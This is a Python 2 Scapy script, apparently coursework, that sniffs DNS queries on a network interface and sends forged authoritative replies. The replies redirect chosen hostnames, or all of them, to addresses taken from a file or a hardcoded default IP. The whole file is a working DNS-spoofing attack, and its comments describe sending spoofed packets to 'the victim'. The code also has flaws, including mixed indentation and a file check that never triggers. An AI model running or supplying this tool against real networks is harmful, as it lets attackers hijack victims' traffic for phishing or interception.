from scapy.all import *
import sys, getopt
import os
import os.path
import ConfigParser
import socket

import socket
import fcntl
import struct

interface= ''
file = ''
exp_filter= ''

#Reference:  https://stackoverflow.com/questions/6382804/how-to-use-getopt-optarg-in-python-how-to-shift-arguments-if-too-many-arguments
def get_interface():
    global interface,file,exp_filter
    try:
        opts, args = getopt.getopt(sys.argv[1:],"i:h:",["interface=","file="])
    except getopt.GetoptError:
        print "Some error in the python file while reading from command line"
        sys.exit(2)

    for opt, arg in opts:
      #print "In for loop, opt = "+opt+"arg = "+arg
      if opt in ('-h', '--file'):
        file = arg
      elif opt in ('-i', '--interface'):
        interface = arg
      else:
        print "Check your parameters once"
        sys.exit(2)

#Filter possible in 2 ways, first if file name is given, second if file not given
    if (len(sys.argv) == 4):
        exp_filter = sys.argv[3]
    elif (len(sys.argv) == 6):
        exp_filter = sys.argv[5]
    #else:
        #print "Problem in filter expression"

    print "Interface is: " + interface + "\nFile is : " + file
    print "Given filter is: " +exp_filter

    return interface

# Reference: https://stackoverflow.com/questions/28292224/scapy-packet-sniffer-triggering-an-action-up-on-each-sniffed-packet
def packet_sniff(packet):
    ipaddr = ''
    #print "In packet sniffer function"	
    #reference: https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    

    #Reference: https://stackoverflow.com/questions/19311673/fetch-source-address-and-port-number-of-packet-scapy-script
	#Here we check the source and destination addresses of our given packet and then try to apply filter if any 
#THen if filter is not mentioned, then also it's fine. THen we send the spoofed packet forward to the victim
    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        print " IP src " + str(ip_src) + " IP Destination " + str(ip_dst)

        #check if our packet is DNS packet or not
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            flag = False
	        packet_for_user = packet[DNSQR].qname
            if len(exp_filter) == 0:
                print "No Expresssion filter given"
            elif ip_src not in exp_filter:
                print "No matching filter IP addr found. Returning"
                return
            else:
                print "Matching filter found in source"

            if file is None:
                print "No file name given, so redirecting to new address"
                redirect_to = '192.168.217.129'
                flag = True
            else:
                with open(file) as f:
                    for line in f:
                        if packet_for_user.rstrip('.') in line:
                            redirect_to = line.split(" ")[0]
			    flag = True

#Ref: https: // stackoverflow.com / questions / 27448905 / send - packet - and -change - its - source - ip
            if flag == True:
                spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                              an=DNSRR(rrname=packet[DNS].qd.qname, ttl=120, rdata=redirect_to))
                send(spoofed_pkt)
                print 'Sent packet', spoofed_pkt.summary()



if __name__ == "__main__":
  interface = get_interface()
  print "DNS Injection begins...."

  #Since we are sniffing on DNS packets, which is on port 53.
  sniff(iface=interface, prn=packet_sniff, filter="udp and port 53", store=0)
  print "DNS Inject finished"


